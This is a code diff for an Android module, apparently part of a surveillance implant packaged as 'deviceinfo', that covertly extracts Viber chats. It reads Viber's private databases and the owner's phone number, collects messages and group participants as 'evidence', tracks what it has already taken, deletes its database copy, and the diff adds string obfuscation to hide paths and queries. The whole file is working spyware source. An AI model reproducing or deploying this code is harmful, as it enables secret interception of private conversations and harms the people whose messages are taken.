@@ -1,11 +1,8 @@
 package com.android.deviceinfo.module.chat;
 
-import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.ObjectInputStream;
-import java.io.StreamCorruptedException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Hashtable;
@@ -17,15 +14,14 @@ import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
 import android.util.Pair;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
-import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatViber extends SubModuleChat {
 	private static final String TAG = "ChatViber";
@@ -36,7 +32,7 @@ public class ChatViber extends SubModuleChat {
 	String dbDir = "/data/data/com.viber.voip/databases";
 	String dbFile = "viber_messages";
 
-	private Hashtable<String, Long> lastViber;
+	private Long lastViberReadDate;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	ChatGroups groups = new ChatViberGroups();
@@ -61,23 +57,22 @@ public class ChatViber extends SubModuleChat {
 
 	@Override
 	protected void start() {
-		lastViber = markup.unserialize(new Hashtable<String, Long>());
+		lastViberReadDate = markup.unserialize(new Long(0));
 
 		account = readMyPhoneNumber();
 		if (account != null) {
-
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
 			readViberMessageHistory();
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (start), read lastViber: " + lastViber);
+			Check.log(TAG + " (start), read lastViber: " + lastViberReadDate);
 		}
 	}
 
 	private String readMyPhoneNumber() {
 		String number = null;
-		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";
+		String file = M.e("/data/data/com.viber.voip/files/preferences/reg_viber_phone_num");
 
 		if (Path.unprotect(file, 4, false)) {
 			FileInputStream fileInputStream;
@@ -86,6 +81,7 @@ public class ChatViber extends SubModuleChat {
 				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
 				Object one = oInputStream.readObject();
 				number = (String) one;
+				
 			} catch (Exception e) {
 				if (Cfg.DEBUG) {
 					e.printStackTrace();
@@ -94,6 +90,9 @@ public class ChatViber extends SubModuleChat {
 			}
 		}
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (readMyPhoneNumber): %s", number);
+		}
 		return number;
 	}
 
@@ -116,9 +115,9 @@ public class ChatViber extends SubModuleChat {
 			return;
 		}
 		// f.0=/data/data/com.whatsapp/databases
-		// String dbDir = Messages.getString("f_0");
+		// String dbDir = M.d("/data/data/com.whatsapp/databases");
 		// f.1=/msgstore.db
-		// dbFile = Messages.getString("f_1");
+		// dbFile = M.d("/msgstore.db");
 		try {
 			boolean updateMarkup = false;
 			if (Path.unprotect(dbDir, dbFile, true)) {
@@ -132,9 +131,9 @@ public class ChatViber extends SubModuleChat {
 
 				groups = new ChatViberGroups();
 
-				List<ViberConversation> conversations = getViberConversations(helper, account);
+				long newViberReadDate = 0;
+				List<ViberConversation> conversations = getViberConversations(helper, account, lastViberReadDate);
 				for (ViberConversation sc : conversations) {
-
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: " + sc.date);
 					}
@@ -142,25 +141,20 @@ public class ChatViber extends SubModuleChat {
 					// retrieves the lastConvId recorded as evidence for this
 					// conversation
 					String thread = Long.toString(sc.id);
-					long lastConvId = lastViber.containsKey(thread) ? lastViber.get(thread) : 0;
-
-					if (sc.date > lastConvId) {
+					
 						if (sc.isGroup() && !groups.hasMemoizedGroup(thread)) {
 							fetchParticipants(helper, thread);
 							groups.addPeerToGroup(thread, account);
 						}
 
-						long lastReadId = fetchMessages(helper, sc, lastConvId);
-						if (lastReadId > 0) {
-							updateMarkupViber(thread, lastReadId, true);
-						}
-					} else {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (readViberMessageHistory) nothing new in conversation: " + thread);
-						}
-					}
+						long lastReadId = fetchMessages(helper, sc, lastViberReadDate);
+						newViberReadDate = Math.max(newViberReadDate, lastReadId);
+					
 				}
-				
+				if (newViberReadDate > 0) {
+					lastViberReadDate = newViberReadDate;
+					updateMarkupViber(lastViberReadDate, true);
+				}
 				helper.deleteDb();
 			} else {
 				if (Cfg.DEBUG) {
@@ -176,12 +170,12 @@ public class ChatViber extends SubModuleChat {
 		}
 	}
 
-	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account) {
+	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account, Long lastViberReadDate) {
 
 		final List<ViberConversation> conversations = new ArrayList<ViberConversation>();
 
-		String[] projection = new String[] { "_id", "date", "recipient_number" };
-		String selection = "date > 0";
+		String[] projection = new String[] { M.e("_id"), M.e("date"), M.e("recipient_number"), M.e("conversation_type") };
+		String selection = "date > " + lastViberReadDate;
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
@@ -193,13 +187,17 @@ public class ChatViber extends SubModuleChat {
 				c.id = cursor.getLong(0);
 				c.date = cursor.getLong(1);
 				c.remote = cursor.getString(2);
+				c.group = cursor.getInt(3) == 1;
+				
 
 				conversations.add(c);
 				return c.id;
 			}
 		};
 
-		helper.traverseRecords("threads", visitor);
+
+		helper.traverseRecords(M.e("conversations"), visitor);
+		
 		return conversations;
 	}
 
@@ -210,12 +208,7 @@ public class ChatViber extends SubModuleChat {
 			Check.log(TAG + " (fetchGroup) : " + thread_id);
 		}
 
-		String[] projection = { "contact_id", "number", "contact_name", "display_name" };
-		String selection = "thread_id" + "='" + thread_id + "' and contact_id >= 0";
-
-		// final Set<String> remotes = new HashSet<String>();
-		// groups.addPeerToGroup(thread_id, "-1");
-		RecordVisitor visitor = new RecordVisitor(projection, selection) {
+		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
 			public long cursor(Cursor cursor) {
@@ -223,9 +216,20 @@ public class ChatViber extends SubModuleChat {
 				String number = cursor.getString(1);
 				String name = cursor.getString(2);
 				String display_name = cursor.getString(3);
+				boolean itsme = cursor.getInt(4) == 0;
 
-				Contact contact = new Contact(Long.toString(id), number, name, display_name);
-				// remotes.add(remote);
+				Contact contact;
+				
+				if(itsme){
+				   contact = new Contact(Long.toString(id), account, "", "");
+				}else{
+				   contact = new Contact(Long.toString(id), number, name, display_name);
+				}
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchParticipants) %s", contact);
+				}
+				
 				if (number != null) {
 					groups.addPeerToGroup(thread_id, contact);
 				}
@@ -233,7 +237,8 @@ public class ChatViber extends SubModuleChat {
 			}
 		};
 
-		helper.traverseRecords("participants", visitor);
+		String sqlquery = M.e("SELECT P._id,  I.number, I.display_name, I.contact_name, I.participant_type from participants as P join participants_info as I on P.participant_info_id = I._id where conversation_id = ?");
+		helper.traverseRawQuery(sqlquery, new String[]{ thread_id }, visitor);
 
 	}
 
@@ -244,8 +249,8 @@ public class ChatViber extends SubModuleChat {
 		try {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			String[] projection = new String[] { "_id", "person", "body", "date", "address", "type" };
-			String selection = "thread_id = " + conversation.id + " and date > " + lastConvId;
+			String[] projection = new String[] { M.e("_id"), M.e("participant_id"), M.e("body"), M.e("date"), M.e("address"), M.e("type") };
+			String selection = M.e("conversation_id = ") + conversation.id + M.e(" and date > ") + lastConvId;
 			String order = "date";
 			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
 
@@ -258,6 +263,7 @@ public class ChatViber extends SubModuleChat {
 					long timestamp = cursor.getLong(3);
 					String address = cursor.getString(4);
 					boolean incoming = cursor.getInt(5) == 0;
+					
 					Date date = new Date(timestamp);
 
 					if (Cfg.DEBUG) {
@@ -280,10 +286,10 @@ public class ChatViber extends SubModuleChat {
 					Contact contact = groups.getContact(peer);
 					String thread = Long.toString(conversation.id);
 					if (isGroup) {
-						if (peer.equals("0")) {
-							peer = conversation.account;
-						}
-						to = groups.getGroupToName(peer, thread);
+						//if (peer.equals("0")) {
+						//	peer = conversation.account;
+						//}
+						to = groups.getGroupToName(from, thread);
 						toDisplay = to;
 					} else {
 						to = incoming ? conversation.account : conversation.remote;
@@ -305,9 +311,7 @@ public class ChatViber extends SubModuleChat {
 				}
 			};
 
-			// f_a=messages
-			// Messages.getString("i_2")
-			long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);
+			long newLastId = helper.traverseRecords(M.e("messages"), visitor);
 
 			if (messages != null && messages.size() > 0) {
 				saveEvidence(messages);
@@ -321,66 +325,26 @@ public class ChatViber extends SubModuleChat {
 			}
 			return -1;
 		}
-
 	}
 
-	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
-		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();
-
-		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
-		queryBuilderIndex.setTables("threads");
-
-		String[] projection = { "thread_id", "address", "date", "body", "person" };
-		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
-
-		// iterate conversation indexes
-		while (cursor != null && cursor.moveToNext()) {
-			// f.5=key_remote_jid
-			String jid = cursor.getString(cursor.getColumnIndexOrThrow("thread_id"));
-			// f.6=message_table_id
-			int mid = cursor.getInt(cursor.getColumnIndexOrThrow("date"));
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
-			}
-
-			int lastReadIndex = 0;
-			// if conversation is known, get the last read index
-			if (hastableConversationLastIndex.containsKey(jid)) {
-
-				lastReadIndex = hastableConversationLastIndex.get(jid);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
-				}
-			}
-
-			// if there's something new, fetch new messages and update
-			// markup
-			if (lastReadIndex < mid) {
-				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
-			}
-
-		}
-		cursor.close();
-		cursor = null;
-		return changedConversations;
-	}
-
-	private void updateMarkupViber(String thread_id, long newLastId, boolean serialize) {
+	private void updateMarkupViber(long newLastId, boolean serialize) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (updateMarkupSkype), mailStore: " + thread_id + " +lastId: " + newLastId);
+			Check.log(TAG + " (updateMarkupViber),  +lastId: " + newLastId);
 		}
-
-		lastViber.put(thread_id, newLastId);
-		try {
-			if (serialize || (newLastId % 10 == 0)) {
+		
+		try{
+			markup.writeMarkupSerializable(newLastId);
+			
+			Long verify = markup.unserialize(new Long(0));
+			if(!lastViberReadDate.equals(verify)){
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
+					Check.log(TAG + " (updateMarkupViber) Error: failed");
 				}
-				markup.writeMarkupSerializable(lastViber);
 			}
+			
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
+				Check.log(TAG + " (updateMarkupViber) Error: " + e);
 			}
 		}
 	}
